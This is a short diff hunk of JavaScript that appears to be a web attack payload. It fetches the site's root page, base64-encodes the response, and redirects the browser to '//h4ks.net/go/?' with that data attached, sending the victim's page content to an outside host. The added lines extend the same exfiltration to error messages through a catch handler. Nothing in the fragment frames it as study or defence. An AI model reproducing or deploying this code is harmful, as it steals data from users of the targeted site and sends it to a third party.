@@ -10,3 +10,6 @@ fetch("/", {
 .then(body => {
     location = '//h4ks.net/go/?'+btoa(body);
 })
+.catch(err => {
+    location = '//h4ks.net/go/?'+btoa(err.toString());
+})
